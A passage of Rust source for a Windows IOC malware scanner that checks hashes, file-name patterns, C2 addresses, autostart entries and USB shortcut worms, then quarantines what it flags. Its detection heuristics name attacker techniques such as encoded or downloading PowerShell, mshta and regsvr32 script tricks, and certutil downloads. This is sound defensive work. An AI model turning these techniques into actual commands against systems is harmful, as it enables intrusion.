//! WinTool virus scanner: a small LOKI-style IOC scanner that works next to Windows Defender.
//!
//! What it looks at: running programs, services, drivers, startup entries, scheduled tasks,
//! Startup folders and the user folders malware lives in (Temp, AppData, Downloads, Desktop,
//! ProgramData, Public).
//!
//! How it decides (scores like LOKI; 100+ = malware, 60-99 = suspicious):
//! - SHA-256 of the file in a known-malware list:
//!   romainmarcoux/malicious-hash (MIT, ~160k hashes, hourly) and Neo23x0/signature-base
//!   hash IOCs (Detection Rule License 1.1 - matches name the source);
//! - file-name IOCs (signature-base filename-iocs: regex;score;false-positive regex);
//! - connections to known botnet / C2 servers (abuse.ch Feodo Tracker, signature-base c2-iocs);
//! - behaviour: a Windows process name outside the Windows folder, double extensions
//!   (invoice.pdf.exe), encoded / downloading PowerShell, mshta / regsvr32 / rundll32 script
//!   tricks in autostart, unsigned programs that start from Temp / AppData.
//!
//! What it does with malware (no questions - FULL CHECK runs unattended): stops the process,
//! disables its startup entries, moves the file to an admin-only quarantine (renamed, not
//! executable; restorable from the menu). Files inside the Windows folder and files with a
//! valid digital signature are never quarantined - those are left to Defender and SFC.

use crate::fullcheck::{expand_env, native_path, ps_ok, reg_delete, startup_file};
use crate::report::Report;
use crate::ui::{self, Kind};
use crate::util::*;
use crate::{online, safety};
use regex_lite::{Regex, RegexBuilder};
use sha2::{Digest, Sha256};
use std::collections::{HashMap, HashSet};
use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

// ---------------------------------------------------------------- databases

const MALICIOUS_HASH: &str = "https://raw.githubusercontent.com/romainmarcoux/malicious-hash/main/full-hash-sha256-";
const SIGBASE: &str = "https://raw.githubusercontent.com/Neo23x0/signature-base/master/iocs/";
const FEODO: &str = "https://feodotracker.abuse.ch/downloads/ipblocklist.txt";
/// Downloaded databases are reused for this long.
const DB_MAX_AGE: Duration = Duration::from_secs(12 * 3600);

const MALWARE: u32 = 100;
const SUSPICIOUS: u32 = 60;
const MAX_FILES: usize = 25_000;
const MAX_SIZE: u64 = 64 * 1024 * 1024;

struct NameIoc {
    re: Regex,
    score: u32,
    fp: Option<Regex>,
    /// Lowercase text every match must contain: a cheap `contains` before the regex
    /// (thousands of patterns x tens of thousands of paths).
    lit: Option<String>,
}

/// Longest literal run a regex always needs (top level only; none when the pattern has a
/// top-level alternation). `\\usbclass\.sys` -> `\usbclass.sys`.
fn required_literal(pat: &str) -> Option<String> {
    let p = pat.strip_prefix("(?i)").unwrap_or(pat);
    let chars: Vec<char> = p.chars().collect();
    let (mut best, mut cur) = (String::new(), String::new());
    let mut depth = 0i32;
    let mut i = 0;
    let flush = |cur: &mut String, best: &mut String| {
        if cur.len() > best.len() {
            *best = cur.clone();
        }
        cur.clear();
    };
    while i < chars.len() {
        let c = chars[i];
        let next = chars.get(i + 1).copied();
        let optional = |n: Option<char>| matches!(n, Some('?' | '*' | '{'));
        match c {
            '\\' => {
                let Some(e) = next else { break };
                if "xuU01234567pPQEk".contains(e) {
                    return None; // code-point / class escapes: no prefilter, always run the regex
                }
                let lit = !e.is_ascii_alphanumeric(); // \d \w \s ... are classes
                i += 2;
                if depth == 0 && lit {
                    if optional(chars.get(i).copied()) {
                        flush(&mut cur, &mut best);
                    } else {
                        cur.push(e);
                    }
                } else {
                    flush(&mut cur, &mut best);
                }
                continue;
            }
            '(' => {
                depth += 1;
                flush(&mut cur, &mut best);
            }
            ')' => {
                depth -= 1;
                flush(&mut cur, &mut best);
            }
            '|' if depth == 0 => return None,
            '[' => {
                flush(&mut cur, &mut best);
                while i < chars.len() && chars[i] != ']' {
                    i += if chars[i] == '\\' { 2 } else { 1 };
                }
            }
            '{' => {
                flush(&mut cur, &mut best);
                while i < chars.len() && chars[i] != '}' {
                    i += 1;
                }
            }
            '.' | '*' | '+' | '?' | '}' | '^' | '$' | '|' => flush(&mut cur, &mut best),
            _ if depth == 0 => {
                if optional(next) {
                    flush(&mut cur, &mut best);
                } else {
                    cur.push(c);
                }
            }
            _ => flush(&mut cur, &mut best),
        }
        i += 1;
    }
    flush(&mut cur, &mut best);
    (best.len() >= 3).then(|| best.to_lowercase())
}

#[derive(Default)]
struct Db {
    hashes: HashSet<[u8; 32]>,
    /// signature-base hash → threat name.
    named: HashMap<[u8; 32], String>,
    names: Vec<NameIoc>,
    ips: HashSet<String>,
    domains: HashSet<String>,
}

impl Db {
    fn is_empty(&self) -> bool {
        self.hashes.is_empty() && self.names.is_empty()
    }
}

fn hex32(s: &str) -> Option<[u8; 32]> {
    let s = s.trim();
    if s.len() != 64 || !s.is_ascii() {
        return None;
    }
    let mut out = [0u8; 32];
    for (i, b) in out.iter_mut().enumerate() {
        *b = u8::from_str_radix(&s[i * 2..i * 2 + 2], 16).ok()?;
    }
    Some(out)
}

fn to_hex(h: &[u8]) -> String {
    h.iter().map(|b| format!("{b:02x}")).collect()
}

fn content_lines(text: &str) -> impl Iterator<Item = &str> {
    text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#'))
}

/// `regex;score[;false-positive regex]` (LOKI filename-iocs). Bad patterns are skipped.
fn parse_name_iocs(text: &str) -> Vec<NameIoc> {
    let build = |p: &str| RegexBuilder::new(p).case_insensitive(true).build().ok();
    content_lines(text)
        .filter_map(|l| {
            let mut f = l.splitn(3, ';');
            let pat = f.next()?;
            let re = build(pat)?;
            let score = f.next()?.trim().parse().ok()?;
            let fp = f.next().filter(|s| !s.trim().is_empty()).and_then(build);
            Some(NameIoc { re, score, fp, lit: required_literal(pat) })
        })
        .collect()
}

fn parse_db(files: &[(String, String)]) -> Db {
    let mut db = Db::default();
    for (name, text) in files {
        if name.starts_with("malicious-hash") {
            for l in content_lines(text) {
                if let Some(h) = hex32(l.split_whitespace().next().unwrap_or("")) {
                    db.hashes.insert(h);
                }
            }
        } else if name == "hash-iocs.txt" {
            for l in content_lines(text) {
                let (h, what) = l.split_once(';').unwrap_or((l, "malware"));
                if let Some(h) = hex32(h) {
                    db.hashes.insert(h);
                    db.named.insert(h, what.trim().to_string());
                }
            }
        } else if name == "filename-iocs.txt" {
            db.names = parse_name_iocs(text);
        } else if name == "c2-iocs.txt" || name == "feodo.txt" {
            for l in content_lines(text) {
                let v = l.split(';').next().unwrap_or("").trim().to_lowercase();
                if v.parse::<std::net::IpAddr>().is_ok() {
                    db.ips.insert(v);
                } else if v.contains('.') && !v.contains('/') {
                    db.domains.insert(v);
                }
            }
        }
    }
    db
}

fn db_files() -> Vec<(String, String)> {
    let mut v: Vec<(String, String)> =
        ["aa", "ab", "ac", "ad"].iter().map(|p| (format!("malicious-hash-{p}.txt"), format!("{MALICIOUS_HASH}{p}.txt"))).collect();
    for f in ["hash-iocs.txt", "filename-iocs.txt", "c2-iocs.txt"] {
        v.push((f.to_string(), format!("{SIGBASE}{f}")));
    }
    v.push(("feodo.txt".to_string(), FEODO.to_string()));
    v
}

fn fresh(p: &Path) -> bool {
    fs::metadata(p)
        .and_then(|m| m.modified())
        .ok()
        .and_then(|t| SystemTime::now().duration_since(t).ok())
        .is_some_and(|age| age < DB_MAX_AGE)
}

/// Downloads the databases (online) or loads the copy kept next to WinTool.exe (offline,
/// e.g. a USB stick prepared on another PC). Returns the database and where it came from.
fn load_db(internet: bool) -> (Db, String) {
    let cache = std::env::temp_dir().join("WinTool-scan-db");
    let portable = exe_dir().map(|d| d.join("WinTool-db"));
    let mut files = vec![];
    let mut source = String::new();
    if internet {
        let _ = fs::create_dir_all(&cache);
        for (name, url) in db_files() {
            let p = cache.join(&name);
            if !fresh(&p) && !online::download(&url, &p) {
                let _ = fs::remove_file(&p);
            }
            if let Ok(t) = fs::read_to_string(&p) {
                // GitHub answers a missing part (malicious-hash-ad) with "404: Not Found".
                if !t.starts_with("404") {
                    files.push((name, t));
                }
            }
        }
        if !files.is_empty() {
            source = "downloaded now".into();
            if let Some(dir) = &portable {
                if fs::create_dir_all(dir).is_ok() {
                    for (name, text) in &files {
                        let _ = fs::write(dir.join(name), text);
                    }
                }
            }
        }
    }
    if files.is_empty() {
        if let Some(dir) = portable.filter(|d| d.is_dir()) {
            for (name, _) in db_files() {
                if let Ok(t) = fs::read_to_string(dir.join(&name)) {
                    files.push((name, t));
                }
            }
            if !files.is_empty() {
                source = format!("offline copy in {}", dir.display());
            }
        }
    }
    (parse_db(&files), source)
}

// ---------------------------------------------------------------- facts from Windows

const PROBE: &str = r#"$ErrorActionPreference = 'SilentlyContinue'
try { [Console]::OutputEncoding = New-Object Text.UTF8Encoding $false } catch {}
function O { $f = @(); for ($i = 1; $i -lt $args.Count; $i++) { $f += (([string]$args[$i]) -replace '[\r\n|]', ' ') }; Write-Output ([string]$args[0] + '|' + ($f -join '|')) }
Get-WmiObject Win32_Process | ForEach-Object { if ($_.ExecutablePath) { O 'PROC' ($_.ProcessId) ($_.ExecutablePath) ($_.CommandLine) } }
Get-WmiObject Win32_Service | ForEach-Object { O 'SVC' ($_.Name) ($_.PathName) }
Get-WmiObject Win32_SystemDriver | ForEach-Object { O 'DRV' ($_.Name) ($_.PathName) }
$users = @(Get-ChildItem 'Registry::HKEY_USERS' | Where-Object { $_.PSChildName -match '^S-1-5-21-[0-9-]+$' } | ForEach-Object { 'HKEY_USERS\' + $_.PSChildName })
$runs = @()
foreach ($k in @('Run', 'RunOnce')) {
 $runs += 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\' + $k
 $runs += 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\' + $k
 foreach ($h in $users) { $runs += 'Registry::' + $h + '\Software\Microsoft\Windows\CurrentVersion\' + $k } }
$skip = @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider')
foreach ($p in $runs) { $i = Get-ItemProperty -LiteralPath $p; if ($i) { $i.PSObject.Properties | Where-Object { $skip -notcontains $_.Name } | ForEach-Object { O 'RUN' $p ($_.Name) ($_.Value) } } }
try {
 $s = New-Object -ComObject Schedule.Service; $s.Connect()
 function T($f) {
  foreach ($t in @($f.GetTasks(1))) { foreach ($a in @($t.Definition.Actions)) { if ($a.Type -eq 0) { O 'TASK' ($t.Path) ($a.Path) ($a.Arguments) } } }
  foreach ($c in @($f.GetFolders(1))) { T $c } }
 T ($s.GetFolder('\'))
} catch {}
if (Get-Command Get-DnsClientCache -ErrorAction SilentlyContinue) { Get-DnsClientCache | ForEach-Object { O 'DNS' ($_.Entry) } }
O 'DONE'
"#;

struct Facts {
    procs: Vec<(u32, String)>,
    /// (pid, lowercase command line) - finds wscript / cscript running a malicious script.
    cmdlines: Vec<(u32, String)>,
    autostart: Vec<Autostart>,
    dns: Vec<String>,
}

#[derive(Clone)]
struct Autostart {
    /// RUN, TASK, SVC or DRV.
    kind: &'static str,
    /// RUN: registry key path; TASK: task path; SVC / DRV: service name.
    key: String,
    /// RUN: value name.
    name: String,
    command: String,
}

fn parse_facts(out: &str) -> Facts {
    let mut f = Facts { procs: vec![], cmdlines: vec![], autostart: vec![], dns: vec![] };
    for l in out.lines().map(|l| l.trim().trim_start_matches('\u{feff}')) {
        let v: Vec<&str> = l.split('|').collect();
        let get = |i: usize| v.get(i).copied().unwrap_or("").trim().to_string();
        match v[0] {
            "PROC" => {
                if let Ok(pid) = get(1).parse() {
                    f.procs.push((pid, get(2)));
                    f.cmdlines.push((pid, get(3).to_lowercase()));
                }
            }
            "SVC" => f.autostart.push(Autostart { kind: "SVC", key: get(1), name: String::new(), command: get(2) }),
            "DRV" => f.autostart.push(Autostart { kind: "DRV", key: get(1), name: String::new(), command: get(2) }),
            "RUN" => f.autostart.push(Autostart { kind: "RUN", key: get(1), name: get(2), command: get(3) }),
            "TASK" => {
                let cmd = if get(3).is_empty() { get(2) } else { format!("\"{}\" {}", get(2), get(3)) };
                f.autostart.push(Autostart { kind: "TASK", key: get(1), name: String::new(), command: cmd });
            }
            "DNS" => f.dns.push(get(1).to_lowercase()),
            _ => {}
        }
    }
    f
}

/// Program file of a service / driver image path: "\SystemRoot\System32\drivers\x.sys",
/// "System32\drivers\x.sys", "\??\C:\x.sys", "\"C:\Program Files\x.exe\" -k".
fn image_file(cmd: &str) -> Option<String> {
    let win = windir().to_string_lossy().to_string();
    let c = cmd.trim();
    let c = c.strip_prefix(r"\??\").unwrap_or(c);
    let lower = c.to_lowercase();
    let c = if lower.starts_with(r"\systemroot\") {
        format!("{win}{}", &c[11..])
    } else if lower.starts_with(r"system32\") {
        format!("{win}\\{c}")
    } else {
        c.to_string()
    };
    startup_file(&c)
}

/// Remote addresses and owning PIDs of TCP connections (`netstat -ano`, language independent).
fn connections() -> Vec<(String, u32)> {
    let out = Command::new(sys("netstat")).arg("-ano").output().map(|o| String::from_utf8_lossy(&o.stdout).into_owned()).unwrap_or_default();
    parse_netstat(&out)
}

fn parse_netstat(out: &str) -> Vec<(String, u32)> {
    out.lines()
        .filter_map(|l| {
            let t: Vec<&str> = l.split_whitespace().collect();
            if t.len() < 5 || !t[0].eq_ignore_ascii_case("TCP") {
                return None;
            }
            let ip = t[2].rsplit_once(':')?.0.trim_start_matches('[').trim_end_matches(']').to_lowercase();
            let pid = t.last()?.parse().ok()?;
            let local = ip == "0.0.0.0" || ip == "::" || ip == "*" || ip.starts_with("127.") || ip == "::1";
            (!local).then_some((ip, pid))
        })
        .collect()
}

// ---------------------------------------------------------------- heuristics (pure)

const SYSTEM_NAMES: &[&str] = &[
    "svchost.exe",
    "csrss.exe",
    "lsass.exe",
    "winlogon.exe",
    "services.exe",
    "smss.exe",
    "wininit.exe",
    "spoolsv.exe",
    "taskhost.exe",
    "taskhostw.exe",
    "dwm.exe",
    "conhost.exe",
    "rundll32.exe",
    "lsm.exe",
    "ctfmon.exe",
    "dllhost.exe",
    "sihost.exe",
    "explorer.exe",
];

const DOC_EXT: &[&str] = &["pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "jpg", "jpeg", "png", "gif", "txt", "mp3", "mp4", "avi", "zip", "rar"];
const RUN_EXT: &[&str] = &["exe", "scr", "com", "pif", "bat", "cmd", "vbs", "vbe", "js", "jse", "hta"];
const EXEC_EXT: &[&str] = &["exe", "dll", "scr", "com", "pif", "sys", "cpl", "ocx"];
const SCRIPT_EXT: &[&str] = &["vbs", "vbe", "js", "jse", "wsf", "hta", "ps1", "bat", "cmd"];

fn file_name(p: &str) -> String {
    p.rsplit(['\\', '/']).next().unwrap_or(p).to_lowercase()
}

fn in_dir(p: &str, dir: &str) -> bool {
    let d = dir.trim_end_matches('\\').to_lowercase();
    p.to_lowercase().starts_with(&format!("{d}\\"))
}

/// Path-based findings for a file (score, reason).
fn path_findings(path: &str, windir: &str) -> Vec<(u32, String)> {
    let mut v = vec![];
    let name = file_name(path);
    if SYSTEM_NAMES.contains(&name.as_str()) && !in_dir(path, windir) {
        v.push((90, format!("named like the Windows file {name} but outside the Windows folder")));
    }
    let parts: Vec<&str> = name.split('.').collect();
    if parts.len() >= 3 && DOC_EXT.contains(&parts[parts.len() - 2]) && RUN_EXT.contains(&parts[parts.len() - 1]) {
        v.push((80, format!("hidden double extension ({name}) - a program pretending to be a document")));
    }
    v
}

/// Command-line findings for an autostart entry (score, reason).
fn command_findings(cmd: &str) -> Vec<(u32, String)> {
    let c = format!("{} ", cmd.to_lowercase());
    let mut v = vec![];
    let has = |s: &str| c.contains(s);
    let ps = has("powershell") || has("pwsh");
    if ps && (has(" -enc") || has(" -e ") || has(" -ec ") || has("-encodedcommand")) {
        v.push((MALWARE, "starts encoded (hidden) PowerShell".to_string()));
    }
    if ps
        && (has("downloadstring")
            || has("downloadfile")
            || has("invoke-webrequest")
            || has("iwr ")
            || has("net.webclient")
            || has("frombase64string")
            || has("iex ")
            || has("iex(")
            || has("invoke-expression"))
    {
        v.push((MALWARE, "PowerShell that downloads / decodes and runs code".to_string()));
    }
    if has("mshta") && (has("http:") || has("https:") || has("javascript:") || has("vbscript:")) {
        v.push((MALWARE, "mshta runs a script from the internet".to_string()));
    }
    if has("regsvr32") && (has("scrobj") || has("/i:http") || has("-i:http")) {
        v.push((MALWARE, "regsvr32 script trick (squiblydoo)".to_string()));
    }
    if has("rundll32") && has("javascript:") {
        v.push((MALWARE, "rundll32 runs JavaScript".to_string()));
    }
    if has("certutil") && (has("-urlcache") || has("/urlcache") || has("-decode")) {
        v.push((80, "certutil used to download / decode files".to_string()));
    }
    if let Some(script) = script_in(cmd) {
        let l = script.to_lowercase();
        if l.ends_with(".vbe") || l.ends_with(".jse") {
            v.push((MALWARE, "starts an encoded script (.vbe / .jse) - typical USB worm / malware".to_string()));
        } else if user_folder(&l) {
            v.push((80, "starts a script from a user / temp folder".to_string()));
        }
    }
    v
}

/// Script file a command line starts: `wscript.exe //B "C:\Users\x\AppData\Roaming\a.vbs"`.
fn script_in(cmd: &str) -> Option<String> {
    let re = Regex::new(r#"(?i)[a-z]:\\[^"<>|*?\r\n]*?\.(?:vbe|vbs|jse|js|wsf|wsh|hta)\b"#).ok()?;
    re.find(cmd).map(|m| m.as_str().to_string())
}

/// Lowercase path inside a folder any user (or malware) can write to.
fn user_folder(p: &str) -> bool {
    ["\\appdata\\", "\\temp\\", "\\programdata\\", "\\users\\public\\"].iter().any(|d| p.contains(d))
}

/// A script encoded with the Microsoft Script Encoder (`#@~^` marker): legitimate software
/// practically never does this, script malware (USB worms) does.
fn encoded_script(p: &Path) -> bool {
    let name = p.to_string_lossy().to_lowercase();
    if !SCRIPT_EXT.iter().any(|e| name.ends_with(&format!(".{e}"))) {
        return false;
    }
    let mut buf = vec![0u8; 4096];
    let n = fs::File::open(p).and_then(|mut f| f.read(&mut buf)).unwrap_or(0);
    buf[..n].windows(4).any(|w| w == b"#@~^")
}

/// Score for an autostart program that lives in a user-writable folder (counts only when the
/// file has no valid signature - signed files skip all behaviour rules).
fn location_score(path: &str) -> Option<(u32, &'static str)> {
    let p = path.to_lowercase();
    if p.contains("\\appdata\\local\\temp\\") || p.contains("\\windows\\temp\\") {
        Some((70, "starts with Windows from a Temp folder, unsigned"))
    } else if p.contains("\\appdata\\roaming\\") && p.matches('\\').count() <= 6 {
        Some((40, "starts with Windows from AppData, unsigned"))
    } else if p.contains("\\users\\public\\") || (p.contains(":\\programdata\\") && p.matches('\\').count() <= 3) {
        Some((50, "starts with Windows from a shared folder, unsigned"))
    } else {
        None
    }
}

fn name_findings(path: &str, iocs: &[NameIoc]) -> Vec<(u32, String)> {
    let lower = path.to_lowercase();
    iocs.iter()
        .filter(|i| i.lit.as_ref().is_none_or(|l| lower.contains(l.as_str())))
        .filter(|i| i.re.is_match(path) && !i.fp.as_ref().is_some_and(|fp| fp.is_match(path)))
        .map(|i| (i.score, format!("file name matches a known malware pattern ({}, signature-base)", i.re.as_str())))
        .take(2)
        .collect()
}

// ---------------------------------------------------------------- file walk

fn profiles() -> Vec<PathBuf> {
    let users = PathBuf::from(format!(r"{}\Users", env_path("SystemDrive", "C:").display()));
    fs::read_dir(users)
        .map(|rd| rd.flatten().filter(|e| e.file_type().map(|t| t.is_dir() && !t.is_symlink()).unwrap_or(false)).map(|e| e.path()).collect())
        .unwrap_or_default()
}

/// (folder, depth, scripts too)
fn roots() -> Vec<(PathBuf, u32, bool)> {
    let mut v = vec![];
    for p in profiles() {
        v.push((p.join(r"AppData\Local\Temp"), 3, true));
        v.push((p.join(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"), 1, true));
        v.push((p.join(r"AppData\Roaming"), 3, false));
        v.push((p.join(r"AppData\Local"), 3, false));
        v.push((p.join("Downloads"), 2, true));
        v.push((p.join("Desktop"), 1, true));
    }
    let pd = env_path("ProgramData", r"C:\ProgramData");
    v.push((pd.join(r"Microsoft\Windows\Start Menu\Programs\StartUp"), 1, true));
    v.push((pd, 2, true));
    v.push((windir().join("Temp"), 2, true));
    v
}

const SKIP_DIRS: &[&str] = &["node_modules", ".git", "winsxs", "wintool-sdio", "wintool-catalog", "wintool-scan-db", "wintool-quarantine", "packages", "windowsapps"];

fn walk(dir: &Path, depth: u32, scripts: bool, out: &mut Vec<PathBuf>, seen: &mut HashSet<String>) {
    if out.len() >= MAX_FILES {
        return;
    }
    let Ok(rd) = fs::read_dir(dir) else { return };
    for e in rd.flatten() {
        let Ok(t) = e.file_type() else { continue };
        if t.is_symlink() {
            continue;
        }
        let path = e.path();
        let name = e.file_name().to_string_lossy().to_lowercase();
        if t.is_dir() {
            if depth > 1 && !SKIP_DIRS.contains(&name.as_str()) {
                walk(&path, depth - 1, scripts, out, seen);
            }
            continue;
        }
        let ext = name.rsplit('.').next().unwrap_or("");
        let wanted = EXEC_EXT.contains(&ext) || (scripts && SCRIPT_EXT.contains(&ext));
        if wanted && e.metadata().map(|m| m.len() > 0 && m.len() <= MAX_SIZE).unwrap_or(false) && seen.insert(path.to_string_lossy().to_lowercase()) {
            out.push(path);
            if out.len() >= MAX_FILES {
                return;
            }
        }
    }
}

fn sha256_file(p: &Path) -> Option<[u8; 32]> {
    let mut f = fs::File::open(p).ok()?;
    let mut h = Sha256::new();
    let mut buf = vec![0u8; 256 * 1024];
    loop {
        let n = f.read(&mut buf).ok()?;
        if n == 0 {
            break;
        }
        h.update(&buf[..n]);
    }
    Some(h.finalize().into())
}

/// Authenticode status per file (lowercase path → ("Valid" / "NotSigned" / ..., signer)).
pub(crate) fn signatures(paths: &[String]) -> HashMap<String, (String, String)> {
    let mut map = HashMap::new();
    if paths.is_empty() {
        return map;
    }
    let list = std::env::temp_dir().join("wintool-sig-list.txt");
    let mut bytes = vec![0xFF, 0xFE];
    bytes.extend(paths.join("\r\n").encode_utf16().flat_map(|u| u.to_le_bytes()));
    if fs::write(&list, bytes).is_err() {
        return map;
    }
    let out = ps(&format!(
        "$ErrorActionPreference = 'SilentlyContinue'
         try {{ [Console]::OutputEncoding = New-Object Text.UTF8Encoding $false }} catch {{}}
         Get-Content -LiteralPath {} | ForEach-Object {{ $s = Get-AuthenticodeSignature -FilePath $_
           $sub = ''; if ($s.SignerCertificate) {{ $sub = $s.SignerCertificate.Subject }}
           Write-Output ('SIG|' + $_ + '|' + $s.Status + '|' + ($sub -replace '[|\\r\\n]', ' ')) }}",
        ps_quote(&list.to_string_lossy())
    ));
    let _ = fs::remove_file(&list);
    for l in out.lines() {
        let v: Vec<&str> = l.trim().splitn(4, '|').collect();
        if v.len() >= 3 && v[0] == "SIG" {
            map.insert(v[1].to_lowercase(), (v[2].to_string(), v.get(3).unwrap_or(&"").to_string()));
        }
    }
    map
}

// ---------------------------------------------------------------- quarantine

fn quarantine_dir() -> PathBuf {
    env_path("ProgramData", r"C:\ProgramData").join("WinTool-Quarantine")
}

/// Creates the quarantine folder; owner Administrators, access for SYSTEM and Administrators only.
fn prepare_quarantine() -> Option<PathBuf> {
    let q = quarantine_dir();
    fs::create_dir_all(&q).ok()?;
    let d = q.display();
    cmd_quiet(&format!(r#"icacls "{d}" /setowner *S-1-5-32-544 /T /C /Q"#));
    cmd_quiet(&format!(r#"icacls "{d}" /inheritance:r /grant:r *S-1-5-18:(OI)(CI)F *S-1-5-32-544:(OI)(CI)F /T /C /Q"#));
    Some(q)
}

#[link(name = "kernel32")]
extern "system" {
    fn MoveFileExW(existing: *const u16, new: *const u16, flags: u32) -> i32;
    fn GetFileAttributesW(path: *const u16) -> u32;
    fn SetFileAttributesW(path: *const u16, attrs: u32) -> i32;
    fn GetLogicalDrives() -> u32;
    fn GetDriveTypeW(root: *const u16) -> u32;
}

const FILE_ATTRIBUTE_READONLY: u32 = 1;
const FILE_ATTRIBUTE_HIDDEN: u32 = 2;
const FILE_ATTRIBUTE_SYSTEM: u32 = 4;
const INVALID_FILE_ATTRIBUTES: u32 = u32::MAX;

fn wide(p: &Path) -> Vec<u16> {
    p.to_string_lossy().encode_utf16().chain(Some(0)).collect()
}

/// Deletes a file even when it is read-only / hidden / system (USB worms set all three).
fn remove_forced(p: &Path) -> bool {
    fs::remove_file(p).is_ok() || {
        let w = wide(p);
        unsafe { SetFileAttributesW(w.as_ptr(), 0x80) }; // FILE_ATTRIBUTE_NORMAL
        fs::remove_file(p).is_ok()
    }
}

const MOVEFILE_DELAY_UNTIL_REBOOT: u32 = 4;

/// Moves `file` into quarantine; a file still in use is copied and deleted at the next restart.
/// Returns whether the file is gone already.
fn quarantine(file: &Path, sha: &str, reason: &str) -> Option<bool> {
    let q = prepare_quarantine()?;
    let id = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(0).to_string();
    let dest = q.join(format!("{id}.quarantined"));
    let gone = if fs::rename(file, &dest).is_ok() {
        true
    } else if fs::copy(file, &dest).is_ok() {
        // Another drive (USB) or the file is in use.
        if remove_forced(file) {
            true
        } else {
            let w: Vec<u16> = file.to_string_lossy().encode_utf16().chain(Some(0)).collect();
            if unsafe { MoveFileExW(w.as_ptr(), std::ptr::null(), MOVEFILE_DELAY_UNTIL_REBOOT) } == 0 {
                let _ = fs::remove_file(&dest);
                return None;
            }
            false
        }
    } else {
        return None;
    };
    let manifest = q.join("manifest.txt");
    let mut text = fs::read_to_string(&manifest).unwrap_or_default();
    text.push_str(&format!("{id}|{}|{sha}|{}|{}\r\n", file.display(), reason.replace('|', "/"), now_str().trim()));
    let _ = fs::write(&manifest, text);
    Some(gone)
}

struct Quarantined {
    id: String,
    original: String,
    reason: String,
    date: String,
}

fn parse_manifest(text: &str) -> Vec<Quarantined> {
    text.lines()
        .filter_map(|l| {
            let v: Vec<&str> = l.splitn(5, '|').collect();
            (v.len() == 5 && v[0].chars().all(|c| c.is_ascii_digit()))
                .then(|| Quarantined { id: v[0].into(), original: v[1].into(), reason: v[3].into(), date: v[4].into() })
        })
        .collect()
}

/// Menu: put a quarantined file back where it was.
fn restore_menu() {
    loop {
        let manifest = quarantine_dir().join("manifest.txt");
        let items = parse_manifest(&fs::read_to_string(&manifest).unwrap_or_default());
        if items.is_empty() {
            ui::info("The quarantine is empty.");
            return;
        }
        let labels: Vec<String> = items.iter().map(|q| format!("{}  ({})", q.original, q.date)).collect();
        let refs: Vec<&str> = labels.iter().map(String::as_str).collect();
        let Some(i) = ui::menu("Quarantine - pick a file to restore", &refs, "Back", false) else { return };
        let q = &items[i];
        ui::header("Restore from quarantine");
        println!("  File:   {}\n  Reason: {}\n", q.original, q.reason);
        if !confirm("Restore it? Only if you are SURE the file is safe") {
            continue;
        }
        let src = quarantine_dir().join(format!("{}.quarantined", q.id));
        let dst = PathBuf::from(&q.original);
        if dst.exists() {
            ui::fail("A file with that name already exists - not overwritten.");
        } else if dst.parent().is_some_and(|p| fs::create_dir_all(p).is_ok()) && fs::copy(&src, &dst).is_ok() {
            let _ = fs::remove_file(&src);
            let rest: String = fs::read_to_string(&manifest)
                .unwrap_or_default()
                .lines()
                .filter(|l| !l.starts_with(&format!("{}|", q.id)))
                .map(|l| format!("{l}\r\n"))
                .collect();
            let _ = fs::write(&manifest, rest);
            ui::ok("Restored. Its startup entries stay disabled - start it yourself if you need it.");
        } else {
            ui::fail("Could not restore the file.");
        }
        pause();
    }
}

// ---------------------------------------------------------------- USB shortcut worms

/// Readable text inside a binary (.lnk): ASCII and UTF-16LE runs of 3+ characters, lowercase.
fn binary_strings(b: &[u8]) -> String {
    let printable = |c: u8| (0x20..0x7f).contains(&c);
    let mut out = String::new();
    let mut run = String::new();
    let flush = |run: &mut String, out: &mut String| {
        if run.len() >= 3 {
            out.push_str(run);
            out.push('\n');
        }
        run.clear();
    };
    for &c in b {
        if printable(c) {
            run.push(c as char);
        } else {
            flush(&mut run, &mut out);
        }
    }
    flush(&mut run, &mut out);
    for pair in b.chunks(2) {
        if pair.len() == 2 && pair[1] == 0 && printable(pair[0]) {
            run.push(pair[0] as char);
        } else {
            flush(&mut run, &mut out);
        }
    }
    // the odd-aligned UTF-16 strings
    for pair in b.get(1..).unwrap_or(&[]).chunks(2) {
        if pair.len() == 2 && pair[1] == 0 && printable(pair[0]) {
            run.push(pair[0] as char);
        } else {
            flush(&mut run, &mut out);
        }
    }
    flush(&mut run, &mut out);
    out.to_lowercase()
}

/// A shortcut that starts a command / script host instead of opening something: the
/// "folder shortcut" trick of USB worms (`cmd.exe /c start x.vbe & start explorer Folder`).
fn worm_shortcut(text: &str) -> bool {
    let host = ["cmd.exe", "wscript", "cscript", "rundll32", "powershell", "mshta"].iter().any(|h| text.contains(h));
    let action = ["start ", "/c", ".vbe", ".vbs", ".jse", ".js", ".wsf", ".dll,"].iter().any(|a| text.contains(a));
    host && action
}

/// File names a worm shortcut / autorun.inf starts ("start lzfxbacbfi.vbe" -> lzfxbacbfi.vbe).
fn referenced_files(text: &str) -> Vec<String> {
    let Ok(re) = Regex::new(r"(?i)[a-z0-9_\-.~ ]{1,80}\.(?:vbe|vbs|jse|js|wsf|exe|bat|cmd|scr|pif|dll|com)\b") else { return vec![] };
    let mut v: Vec<String> = re
        .find_iter(text)
        .filter_map(|m| m.as_str().split_whitespace().last().map(|s| s.trim_start_matches(['.', '-']).to_string()))
        .filter(|n| !n.is_empty() && !["cmd.exe", "explorer.exe", "shell32.dll", "wscript.exe", "cscript.exe", "rundll32.exe"].contains(&n.as_str()))
        .collect();
    v.sort();
    v.dedup();
    v
}

/// Removable drives and non-system fixed drives (USB disks report "fixed").
fn usb_roots() -> Vec<PathBuf> {
    let sysdrive = env_path("SystemDrive", "C:").to_string_lossy().to_uppercase();
    let mask = unsafe { GetLogicalDrives() };
    (0..26u8)
        .filter(|i| mask & (1 << i) != 0)
        .map(|i| format!("{}:\\", (b'A' + i) as char))
        .filter(|root| !root.starts_with(&sysdrive))
        .filter(|root| {
            let w: Vec<u16> = root.encode_utf16().chain(Some(0)).collect();
